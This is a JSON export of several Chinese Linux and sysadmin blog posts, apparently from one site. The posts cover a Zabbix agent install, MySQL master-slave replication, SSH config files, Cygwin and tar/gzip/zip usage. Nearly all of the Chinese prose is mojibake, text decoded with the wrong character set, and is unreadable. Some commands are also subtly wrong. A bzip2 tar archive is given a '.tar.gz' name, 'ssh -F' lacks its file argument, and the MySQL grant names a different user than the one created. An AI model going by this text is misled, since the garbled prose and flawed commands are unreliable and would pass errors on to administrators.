Agentï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œé‚£å°±éœ€è¦é¢å¤–å®‰è£…zabbix-mysqlã€zabbix-nginx-confã€zabbix-frontend-phpã€‚ 1234$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update$ apt install zabbix-agent é…ç½® Zabbix Agent12345# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.confServerï¼šZabbix Server çš„IP åœ°å€ServerActiveï¼šZabbix Server çš„IP åœ°å€Hostnameï¼šZabbix Agent è¿™å°ä¸»æœºçš„åˆ«å æ ¸å¿ƒçš„é…ç½®åªæœ‰è¿™ä¸‰è¡Œï¼Œæ”¹å®Œä¹‹åï¼Œé‡å¯ä»¥ä¸‹ Zabbix Agentã€‚ 1$ systemctl restart zabbix-agent æ·»åŠ ä¸»æœºå®Œæˆä»¥ä¸Šé…ç½®ä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯æ‰“å¼€ Zabbix çš„Web ç«¯ï¼Œå¼€å§‹æ·»åŠ ä¸»æœºã€‚ é…ç½®ä¸»æœºåŸºç¡€ä¿¡æ¯ï¼š ä¸»æœºåç§°ï¼šzabbix_agentd.conf ä¸­çš„Hostname å®¢æˆ·ç«¯IPï¼šéœ€è¦ç›‘æ§çš„ä¸»æœºçš„IP åœ°å€ ç«¯å£é»˜è®¤ä½¿ç”¨ 10050 é…ç½®æ¨¡ç‰ˆï¼š éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰é…ç½®æ¨¡ç‰ˆï¼Œå¯èƒ½ä¼šå¯¼è‡´æ²¡æœ‰æ•°æ®ã€‚ ç„¶åç‚¹å‡»æ·»åŠ å³å¯ã€‚ æ‰“å¼€ç›‘æ§é¢æ¿ï¼Œç‚¹å‡»ä¸»æœºï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸»æœºçŠ¶æ€åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚ è‡³æ­¤å°±å®Œæˆäº†Agent çš„æ·»åŠ ï¼Œç‚¹å‡»æœ€æ–°æ•°æ®æˆ–è€…å›¾å½¢å¯ä»¥çœ‹åˆ°ç›¸åº”çš„æ•°æ®ã€‚ å‚è€ƒé“¾æ¥ å®‰è£…zabbix-agentå¹¶æ·»åŠ åˆ°zabbix webä¸­ç›‘æ§ Zabbix ä½¿ç”¨ Zabbix-Agent æ·»åŠ æ–°çš„LinuxæœåŠ¡å™¨ç›‘æ§","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Mysql ä¸»ä»æ¶æ„é…ç½®","slug":"mysql-master-slave-architecture-configuration","date":"2020-09-03T15:40:16.000Z","updated":"2020-09-03T15:43:51.804Z","comments":true,"path":"mysql-master-slave-architecture-configuration/","link":"","permalink":"https://www.0x2beace.com/mysql-master-slave-architecture-configuration/","excerpt":"Mysql ä¸»ä»é…ç½®æ˜¯æ•°æ®åº“åŒæ­¥çš„å¿…è¦æ­¥éª¤ã€‚","text":"Mysql ä¸»ä»é…ç½®æ˜¯æ•°æ®åº“åŒæ­¥çš„å¿…è¦æ­¥éª¤ã€‚ ä¸»æœºç¯å¢ƒï¼š Ubuntu 18.04 LTS Mysql 5.7 ä¸‹é¢ä¼šå°†ä¸»æ•°æ®åº“ç®€ç§°ä¸ºMasterï¼Œä»æ•°æ®åº“ç®€ç§°ä¸º Slaveã€‚ é…ç½®Master1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# æ‰“å¼€äºŒè¿›åˆ¶æ—¥å¿—[mysqld]server_id&#x3D;1log-bin&#x3D;master-binlog-bin-index&#x3D;master-bin.index åˆ›å»ºåŒæ­¥ç”¨æˆ·ï¼Œå¹¶èµ‹äºˆæƒé™ï¼ˆå¦‚æœä»æœåŠ¡å™¨ä»¥reql è¿™ä¸ªè´¦å·è¿›è¡Œè¿æ¥ï¼Œå°±èµ‹äºˆåŒæ­¥æ•°æ®åº“çš„æƒé™ï¼Œå¹¶ä¸”è¿™ä¸ªæƒé™æ˜¯æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰æ•°æ®è¡¨ï¼‰ 1234$ mysql -uroot -p mysql&gt; create user repl;mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;mysql&gt; flush privileges; ä¸Šé¢çš„IP æ˜¯æŒ‡ Slave æœåŠ¡å™¨çš„IP åœ°å€ã€‚é‡å¯Mysql æœåŠ¡ã€‚ æŸ¥çœ‹Master é…ç½®ï¼š 1mysql&gt; show master status; Salve é…ç½®1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# æ‰“å¼€relay æ—¥å¿—[mysqld]server_id&#x3D;2relay-log-index&#x3D;slave-relay-bin.indexrelay-log&#x3D;slave-relay-bin é‡å¯Mysql æœåŠ¡ã€‚ æŒ‡å®šMaster ä¸»æœº 12$ mysql -uroot -pmysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0; å‚æ•°è¯´æ˜ï¼š master_hostï¼šMasterâˆ‘ä¸»æœºçš„å¤–ç½‘IP åœ°å€ master_portï¼šç«¯å£ master_userï¼šMasterä¸»æœºä¸Šè¿›è¡ŒåŒæ­¥çš„ç”¨æˆ· master_passwordï¼šå¯†ç  master_log_fileï¼šMaster è¾“å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°ï¼ˆåœ¨Master ä¸»æœºä¸Šä½¿ç”¨show master statuså‘½ä»¤æŸ¥çœ‹ï¼‰ master_log_posï¼šå“ªé‡Œå¼€å§‹åŒæ­¥ å¼€å¯ä¸»ä»åŒæ­¥ 1mysql&gt; start slave; æŸ¥çœ‹ä»åº“åŒæ­¥çŠ¶æ€ 1mysql&gt; show slave status; å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ Last_Errno: 1146 Last_Error: Error executing row event: â€˜Table â€˜panda.tâ€™ doesnâ€™t existâ€™ è§£å†³åŠæ³•ï¼šä½¿ç”¨slave-skip-errors å‚æ•°è·³è¿‡è¯¥é”™è¯¯ã€‚ 1234# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf[mysqld]slave_skip_errors&#x3D;1146 é‡å¯ä»åº“å³å¯ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"äº†è§£ SSH Config","slug":"understand-ssh-config","date":"2020-09-02T15:58:02.000Z","updated":"2020-09-02T15:58:54.842Z","comments":true,"path":"understand-ssh-config/","link":"","permalink":"https://www.0x2beace.com/understand-ssh-config/","excerpt":"å¾ˆæ—©å°±æ¥è§¦åˆ°äº†SSHï¼Œèµ·åˆå¹¶ä¸çŸ¥é“æœ‰ssh configè¿™æ ·ä¸€ä¸ªä¸œè¥¿å­˜åœ¨ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼Œä¸­é—´é‡åˆ°è¿‡ä¸å°‘é—®é¢˜ï¼Œèµ°è¿‡ä¸å°‘å¼¯è·¯ã€‚ æœ€åæ€»ç»“å‡ºæ¥äº†ä¸¤ä¸ªè§£å†³åŠæ³•ï¼Œä»Šå¤©æ— æ„é—´å‘ç°åŸæ¥å…¶ä¸­æœ‰ä¸€ä¸ªè¿™ä¹ˆå¥½ç”¨çš„å·¥å…·ä¸€ç›´éƒ½è¢«æˆ‘å¿½ç•¥äº†ã€‚","text":"å¾ˆæ—©å°±æ¥è§¦åˆ°äº†SSHï¼Œèµ·åˆå¹¶ä¸çŸ¥é“æœ‰ssh configè¿™æ ·ä¸€ä¸ªä¸œè¥¿å­˜åœ¨ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼Œä¸­é—´é‡åˆ°è¿‡ä¸å°‘é—®é¢˜ï¼Œèµ°è¿‡ä¸å°‘å¼¯è·¯ã€‚ æœ€åæ€»ç»“å‡ºæ¥äº†ä¸¤ä¸ªè§£å†³åŠæ³•ï¼Œä»Šå¤©æ— æ„é—´å‘ç°åŸæ¥å…¶ä¸­æœ‰ä¸€ä¸ªè¿™ä¹ˆå¥½ç”¨çš„å·¥å…·ä¸€ç›´éƒ½è¢«æˆ‘å¿½ç•¥äº†ã€‚ ä»€ä¹ˆæ˜¯SSH Config å…ˆå†³æ¡ä»¶ï¼šåœ¨ä½¿ç”¨ssh ä¹‹å‰ï¼Œéœ€è¦å…ˆå®‰è£…å¥½Opensshã€SSH1æˆ–è€…æ˜¯SSH2ã€‚ï¼ˆLinuxã€Macç”¨æˆ·è¯·å¿½ç•¥ï¼‰ ~/.ssh/config æ˜¯é€šè¿‡ssh è¿æ¥è¿œç¨‹æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨SSH Configä¾‹å¦‚ï¼šä½¿ç”¨SSH è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åšï¼š 1$ ssh Boo@18.182.201.142 åœ¨ç®€å•åœ°è¿æ¥æƒ…å†µä¸‹ï¼Œå®ƒå¹¶ä¸éº»çƒ¦ã€‚ä½†æ˜¯å½“ç«¯å£å·ä¸æ˜¯é»˜è®¤å€¼ï¼ˆ22ï¼‰æ—¶ï¼Œå½“å¯†é’¥å¯¹ä¸æ˜¯é»˜è®¤åç§°æ—¶ï¼Œè¿æ¥å°±å˜å¾—å¤æ‚äº†ã€‚ 12345678# æŒ‡å®šç«¯å£è¿æ¥$ ssh Boo@18.182.201.142 -p 2222# éé»˜è®¤åç§°å¯†é’¥è®¤è¯$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142# ä»¥ä¸Šä¸¤ç§æƒ…å†µç»¼åˆ$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222 æ­¤æ—¶ï¼Œä½¿ç”¨ssh configå°±å˜å¾—å¾ˆæœ‰ç”¨äº†ã€‚ 123456# vim ~&#x2F;.ssh&#x2F;configHost aliyun HostName 18.182.201.142 Port 2222 User Boo IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun ç°åœ¨åœ¨è¿æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ ssh aliyun æ˜¯ä¸æ˜¯éå¸¸çš„æ–¹ä¾¿ï¼å°±ç®—æ­¤æ—¶æ‰‹ä¸Šæœ‰å¤šå°æœåŠ¡å™¨éœ€è¦ç®¡ç†ï¼Œåªè¦é…ç½®å¥½å¯¹åº”çš„~/.ssh/configå‚æ•°ï¼Œå°±å¯ä»¥å¾ˆè½»æ¾çš„è¿›è¡Œè¿æ¥äº†ã€‚ ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæœ‰å…³ssh çš„é…ç½®ä¸èƒ½åˆ†æˆå¤šä¸ªæ–‡ä»¶ï¼Œåªèƒ½å†™åœ¨è¿™ä¸€ä¸ªæ–‡ä»¶ä¸­~/.ssh/configï¼ˆå¦‚æœä½ æœ‰æ›´å¥½çš„åŠæ³•ï¼‰ã€‚ SSH çš„é…ç½®æ–‡ä»¶åŒæ ·é€‚ç”¨äºå…¶ä»–ç¨‹åºï¼Œå¦‚ï¼šscpï¼Œsftpç­‰ã€‚ å¸¸ç”¨çš„é…ç½®é€‰é¡¹é…ç½®æ–‡ä»¶æ ¼å¼ ç©ºè¡Œå’Œä»¥â€™ï¼ƒâ€™å¼€å¤´çš„è¡Œæ˜¯æ³¨é‡Šã€‚ æ¯è¡Œä»¥å…³é”®å­—å¼€å¤´ï¼Œåè·Ÿå‚æ•°ã€‚ é…ç½®é€‰é¡¹å¯ä»¥ç”¨ç©ºæ ¼æˆ–å¯é€‰çš„ç©ºæ ¼åˆ†éš”ï¼Œåªéœ€è¦ä¸€ä¸ª=ã€‚ å‚æ•°å¯ä»¥ç”¨åŒå¼•å·ï¼ˆâ€ï¼‰æ‹¬èµ·æ¥ï¼Œä»¥æŒ‡å®šåŒ…å«ç©ºæ ¼çš„å‚æ•°ã€‚ å¸¸ç”¨å…³é”®å­—SSH Config çš„å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯å‚æ•°åŒºåˆ†å¤§å°å†™ã€‚ Hostï¼šå¯ä»¥ç†è§£ä¸ºè¿œç¨‹ä¸»æœºåçš„åˆ«åï¼Œæœ€ç»ˆæŒ‡æ˜è¿™ä¸ªåç§°è¿›è¡Œè¿æ¥ï¼Œå¦‚ï¼šssh aliyun HostNameï¼šéœ€è¦è¿œç¨‹è¿æ¥çš„ä¸»æœºåï¼Œé€šå¸¸éƒ½æ˜¯IPã€‚ Portï¼šæŒ‡å®šè¿æ¥ç«¯å£ Userï¼šæŒ‡å®šè¿æ¥ç”¨æˆ· IdentityFileï¼šæŒ‡æ˜è¿œç¨‹è¿æ¥å¯†é’¥æ–‡ä»¶ æ³¨ï¼šHost å…³é”®å­—å¯ä»¥åŒ…å«ä»¥ä¸‹æ¨¡å¼åŒ¹é…ï¼š *- åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼ŒHost å°†åŒ¹é…æ‰€æœ‰ä¸»æœºï¼ŒåŒæ—¶`192.168.0.åŒ¹é…192.168.0.0/24`å­ç½‘ä¸­çš„æ‰€æœ‰ä¸»æœºã€‚ ? - æ°å¥½åŒ¹é…ä¸€ä¸ªå­—ç¬¦ã€‚è¯¥æ¨¡å¼Host 10.10.0.?å°†åŒ¹é…10.10.0.[0-9]èŒƒå›´å†…çš„æ‰€æœ‰ä¸»æœºã€‚ !- åœ¨æ¨¡å¼çš„å¼€å¤´å°†å¦å®šå…¶åŒ¹é…ä¾‹å¦‚ï¼ŒHost 10.10.0.* !10.10.0.5å°†åŒ¹é…10.10.0.0/24å­ç½‘ä¸­çš„ä»»ä½•ä¸»æœºï¼Œé™¤äº†10.10.0.5ã€‚ é…ç½®æ–‡ä»¶åŠ è½½é¡ºåº å…¨å±€é…ç½®æ–‡ä»¶ï¼š/etc/ssh/ssh_config ç”¨æˆ·é…ç½®æ–‡ä»¶ï¼š~/.ssh/config ssh å®¢æˆ·ç«¯æŒ‰ä»¥ä¸‹ä¼˜å…ˆé¡ºåºè¯»å–å…¶é…ç½®ï¼š ä»å‘½ä»¤è¡ŒæŒ‡å®šçš„é€‰é¡¹ ç”¨æˆ·çš„ssh é…ç½®æ–‡ä»¶ å…¨å±€çš„ssh é…ç½®æ–‡ä»¶ å¦‚æœå¸Œæœ›SSH å®¢æˆ·ç«¯å¿½ç•¥ssh é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„æ‰€æœ‰é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ï¼š 1$ ssh -F user@example.com æ¢å¤è¿æ¥å¸¸ç”¨SSH çš„å°ä¼™ä¼´å¯èƒ½éƒ½çŸ¥é“ï¼Œä½¿ç”¨SSH è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ä¹‹åï¼Œå¦‚æœä¸€æ®µæ—¶é—´æ²¡æœ‰è¾“å…¥ä»»ä½•æŒ‡ä»¤ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šæ–­å¼€ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œéœ€è¦é‡è¿å°±ä¼šå˜å¾—å¾ˆéº»çƒ¦ã€‚ æ­¤æ—¶ï¼Œssh config åˆå˜å¾—å¾ˆæœ‰ç”¨äº†ã€‚ 123456ï¼ƒå®šæœŸå‘æœåŠ¡å™¨å‘é€å®æ—¶æŠ¥å‘Šï¼ˆæ¯60ç§’ï¼Œå¯ä»¥è‡ªå®šä¹‰ï¼‰ServerAliveInterval 60# å¦‚æœæƒ³è¦é’ˆå¯¹æŸä¸ªè¿æ¥å•ç‹¬ä½¿ç”¨ï¼Œéœ€è¦æ”¾åœ¨Host æŒ‡ä»¤ä¸‹ï¼Œå…¨å±€åˆ™æ”¾åœ¨æœ€å¤´éƒ¨Host aliyun ServerAliveInterval 60 å¯èƒ½æ„Ÿå…´è¶£çš„å†…å®¹ å¦‚ä½•åœ¨Linux ä¸­æ›´æ”¹SSH ç«¯å£ å…³äº ~/.ssh/config ä½¿ç”¨ SSH é…ç½®æ–‡ä»¶ ssh_config æŒ‡ä»¤è¯¦è§£ SSH å®˜ç½‘ OpenSSH å®¢æˆ·ç«¯SSH é…ç½®æ–‡ä»¶","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Cygwin å¿«é€Ÿä¸Šæ‰‹","slug":"cygwin-quick-start","date":"2020-09-01T14:16:25.000Z","updated":"2020-09-03T15:47:42.934Z","comments":true,"path":"cygwin-quick-start/","link":"","permalink":"https://www.0x2beace.com/cygwin-quick-start/","excerpt":"åœ¨å¾ˆæ—©ä¹‹å‰å°±å¬è¯´è¿‡Cygwinå’ŒMinGW64è¿™ä¸¤ä¸ªä¸œè¥¿ï¼Œåªæ˜¯å½“æ—¶ä¸æ˜¯å¾ˆç†è§£è¿™ä¸¤ä¸ªä¸œè¥¿æ˜¯åšä»€ä¹ˆçš„ï¼Œè¿˜ç»å¸¸å’ŒmsysGit ææ··æ·†ï¼ŒåŠ ä¸Šæœ€è¿‘ç”¨MinGW64ç”¨çš„å¾ˆä¸é¡ºæ‰‹ï¼Œæ‰€ä»¥æ‰“ç®—å®‰è£…ä¸€ä¸ªCygwinã€‚","text":"åœ¨å¾ˆæ—©ä¹‹å‰å°±å¬è¯´è¿‡Cygwinå’ŒMinGW64è¿™ä¸¤ä¸ªä¸œè¥¿ï¼Œåªæ˜¯å½“æ—¶ä¸æ˜¯å¾ˆç†è§£è¿™ä¸¤ä¸ªä¸œè¥¿æ˜¯åšä»€ä¹ˆçš„ï¼Œè¿˜ç»å¸¸å’ŒmsysGit ææ··æ·†ï¼ŒåŠ ä¸Šæœ€è¿‘ç”¨MinGW64ç”¨çš„å¾ˆä¸é¡ºæ‰‹ï¼Œæ‰€ä»¥æ‰“ç®—å®‰è£…ä¸€ä¸ªCygwinã€‚ åŒºåˆ«ä¸è”ç³»é¦–å…ˆæ¥ä»‹ç»ä¸‹è¿™ä¸‰è€…åˆ†åˆ«æ˜¯ä»€ä¹ˆã€‚ CygwinCygwinæ˜¯ä¸€ä¸ªç±»ä¼¼Unixçš„ç¯å¢ƒå’ŒMicrosoft Windowså‘½ä»¤è¡Œç•Œé¢ã€‚ å¤§é‡GNUå’Œå¼€æºå·¥å…·ï¼Œæä¾›ç±»ä¼¼äº Windowsä¸Šçš„ Linuxå‘è¡Œç‰ˆçš„åŠŸèƒ½ã€‚ç”¨å®˜ç½‘çš„è¯è¯´å°±æ˜¯ï¼šåœ¨Windows ä¸Šè·å–Linux çš„æ„Ÿè§‰ã€‚ MinGW64MSYS(MSYS | MinGW) æ˜¯ä¸€ä¸ªåœ¨ Windows ä¸‹çš„ç±»Unitå·¥ä½œç¯å¢ƒã€‚å› ä¸º Git é‡Œé¢åŒ…å«å¾ˆå¤š Shell è·Ÿ Perl è„šæœ¬ï¼Œæ‰€ä»¥å®ƒ(Git)éœ€è¦ä¸€ä¸ªè¿™æ ·çš„ç¯å¢ƒã€‚ æ¯æ¬¡å³é”®æ‰“å¼€Git Bashæ—¶ï¼Œå…¶ç»ˆç«¯å°±æ˜¯MinGW64 msysGitmsysGitæ˜¯ä¸€ä¸ªæ„å»ºç¯å¢ƒï¼Œå…¶ä¸­åŒ…å«å¸Œæœ›é€šè¿‡ä¸ºGit for Windowsç¼–å†™ä»£ç æ¥è´¡çŒ®æ‰€éœ€çš„æ‰€æœ‰å·¥å…·ã€‚ æ‰€ä»¥ï¼ŒGit for Windows å¯ä»¥åœ¨ Windows ä¸Šå®‰è£…å¯è¿è¡Œ Git çš„æœ€å°ç¯å¢ƒï¼Œè€Œ msysGit æ˜¯æ„å»º Git for Windows æ‰€éœ€çš„ç¯å¢ƒã€‚ å®‰è£…Cygwinå®‰è£…Cygwin çš„è¿‡ç¨‹æ¯”MinGW è¦å¤æ‚äº›ï¼Œå…¶ä¸­ä¸»è¦éœ€è¦æ³¨æ„çš„æ˜¯æ¨¡å—éƒ¨åˆ†ã€‚ Cygwin å¥½ç”¨çš„åŸå› å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå…¶åŠŸèƒ½ä¹‹ä¸°å¯Œï¼Œè€Œå„ç§åŠŸèƒ½åˆ™æ˜¯æ¥è‡ªäºå…¶æ¨¡å—ã€‚ ç»ˆäºå®‰è£…å¥½äº†ï¼Œæ„Ÿè§‰å¾ˆå‰å®³çš„æ ·å­ï¼Œæ˜¯æˆ‘æƒ³è¦çš„ä¸œè¥¿ï¼Œå¸Œæœ›åœ¨ä»Šåçš„æ—¥å­ä¸­ èƒ½å’Œå®ƒå¥½å¥½ç›¸å¤„ã€‚ Minttyæ˜¯ä¸€ä¸ªç»ˆç«¯ä»¿çœŸå™¨ ç”¨äºCygwinçš„ï¼Œ MSYSæˆ– Msys2 å’Œè¡ç”Ÿçš„é¡¹ç›®ï¼Œä»¥åŠç”¨äºWSLã€‚ å‚è€ƒé“¾æ¥ ä»Windows è¿è¡Œä¸‹è½½Cygwin64 Cygwin æ˜¯ä»€ä¹ˆï¼Œä¸æ˜¯ä»€ä¹ˆï¼Ÿâ€“å®˜ç½‘ Cygwin å®‰è£…æ•™ç¨‹ è¯¦ç»†","categories":[{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"}],"tags":[{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"ç»ˆç«¯","slug":"ç»ˆç«¯","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"}]},{"title":"Linux å‹ç¼©ã€è§£å‹ã€æ‰“åŒ…è¯¦è§£","slug":"detailed-explanation-of-linux-compression-decompression-and-packaging","date":"2020-08-31T15:47:15.000Z","updated":"2020-09-17T12:51:47.804Z","comments":true,"path":"detailed-explanation-of-linux-compression-decompression-and-packaging/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/","excerpt":"åœ¨Linux ä¸­ï¼Œè§£å‹ã€å‹ç¼©ã€æ‰“åŒ…æ˜¯æ—¥å¸¸ä¼šå¾ˆé¢‘ç¹ç”¨åˆ°çš„å‡ ä¸ªæ“ä½œï¼Œä½†æ˜¯å› ä¸ºå‚æ•°å¾ˆå¤šï¼Œæ²¡æœ‰è®°å¿†ç‚¹ï¼ŒåŠ ä¸Šå‹ç¼©æ–‡ä»¶çš„ç±»å‹å¾ˆå¤šï¼Œå¦‚æœä¸ç»å¸¸ä½¿ç”¨ï¼Œæ˜¯çœŸçš„å®¹æ˜“å¿˜è®°ã€‚","text":"åœ¨Linux ä¸­ï¼Œè§£å‹ã€å‹ç¼©ã€æ‰“åŒ…æ˜¯æ—¥å¸¸ä¼šå¾ˆé¢‘ç¹ç”¨åˆ°çš„å‡ ä¸ªæ“ä½œï¼Œä½†æ˜¯å› ä¸ºå‚æ•°å¾ˆå¤šï¼Œæ²¡æœ‰è®°å¿†ç‚¹ï¼ŒåŠ ä¸Šå‹ç¼©æ–‡ä»¶çš„ç±»å‹å¾ˆå¤šï¼Œå¦‚æœä¸ç»å¸¸ä½¿ç”¨ï¼Œæ˜¯çœŸçš„å®¹æ˜“å¿˜è®°ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°å°±æ˜¯ç”¨æ¥æ•´ç†å¸¸è§çš„é‚£äº›è§£å‹ã€å‹ç¼©ã€æ‰“åŒ…çš„å‘½ä»¤ã€‚ åœ¨æ­£å¼å­¦ä¹ ä¹‹å‰ï¼Œéœ€è¦æ˜ç¡®çš„ä¸¤ä¸ªæ¦‚å¿µï¼Œæ‰“åŒ…å’Œå‹ç¼©ä¸æ˜¯ä¸€å›äº‹ï¼š æ‰“åŒ…ï¼šæ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ã€‚ å‹ç¼©ï¼šåˆ™æ˜¯å°†ä¸€ä¸ªå¤§æ–‡ä»¶é€šè¿‡å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinux ä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ tarå‹ç¼©/æ‰“åŒ…ä»…æ‰“åŒ…ï¼Œä¸å‹ç¼©ã€‚ 1tar -cvf foo.tar foo foo.tarè¿™ä¸ªæ–‡ä»¶åæ˜¯è‡ªå®šä¹‰çš„ï¼Œåªæ˜¯ä¹ æƒ¯ä¸Šæˆ‘ä»¬ä½¿ç”¨ .tar ä½œä¸ºåŒ…æ–‡ä»¶ã€‚ æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-zå‚æ•°è¡¨ç¤ºä»¥ .tar.gz æˆ–è€… .tgz åç¼€åä»£è¡¨ gzip å‹ç¼©è¿‡çš„ tar åŒ…ã€‚ 1tar -zcvf foo.tar.gz foo æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-j å‚æ•°è¡¨ç¤ºä»¥ .tar.bz2 åç¼€åä½œä¸ºtaråŒ…åã€‚ 1tar -jcvf foo.tar.gz foo è§£å‹åœ¨å½“å‰ç›®å½•ä¸‹ç›´æ¥è§£å‹ï¼š 1tar -zxvf foo.tar.gz æ³¨æ„ï¼Œå¦‚æœè¿™ä¸ªç›®å½•ä¸‹æœ‰åŒåçš„æ–‡ä»¶ï¼Œä¸ä¼šè¯¢é—®ï¼Œç›´æ¥è¦†ç›–ã€‚ è§£å‹è‡³æŒ‡å®šæ–‡ä»¶å¤¹ï¼š 1tar -zxvf foo.tar.gz -C &lt;dir name&gt; gzipgzip å‘½ä»¤ç”¨æ¥å‹ç¼©æ–‡ä»¶ã€‚æ–‡ä»¶ç»å®ƒå‹ç¼©è¿‡åï¼Œå…¶åç§°åé¢ä¼šå¤šå¤„ .gz æ‰©å±•åï¼ˆä¸å¸¦ .tarï¼‰ã€‚ å‹ç¼©å°†å½“å‰ç›®å½•çš„æ¯ä¸ªæ–‡ä»¶å‹ç¼©æˆ.gzæ–‡ä»¶ï¼š 1gzip * é€’å½’å‹ç¼©æŒ‡å®šç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ï¼š 1gzip -r &lt;dir name&gt; è§£å‹è§£å‹å½“å‰ç›®å½•ä¸‹çš„foo.gz æ–‡ä»¶ï¼š 1gzip -d foo.gz è§£å‹å®Œæˆä¹‹åï¼Œfoo.gz å°±å˜æˆäº† foo æ–‡ä»¶ã€‚ é€’å½’è§£å‹ç›®å½•ï¼š 1gzip -dr &lt;dir name&gt; è§£å‹å®Œæˆä¹‹åï¼Œ&lt;dir name&gt; ç›®å½•ä¸‹çš„æ‰€æœ‰ .gz æ–‡ä»¶éƒ½ä¼šå˜æˆæ­£å¸¸æ–‡ä»¶ã€‚ zipzip å¯ä»¥ç”¨æ¥è§£å‹ç¼©æ–‡ä»¶ï¼Œæˆ–è€…å¯¹æ–‡ä»¶è¿›è¡Œæ‰“åŒ…æ“ä½œã€‚æ–‡ä»¶ç»å®ƒå‹ç¼©åä¼šå¦å¤–äº§ç”Ÿå…·æœ‰ .zip æ‰©å±•åçš„å‹ç¼©æ–‡ä»¶ã€‚ å‹ç¼©å°†å½“å‰ç›®å½•ä¸‹çš„æŒ‡å®šç›®å½•ï¼Œå‹ç¼©ä¸º .zipæ–‡ä»¶ï¼š 1zip -q -r foo.zip &lt;dir name&gt; 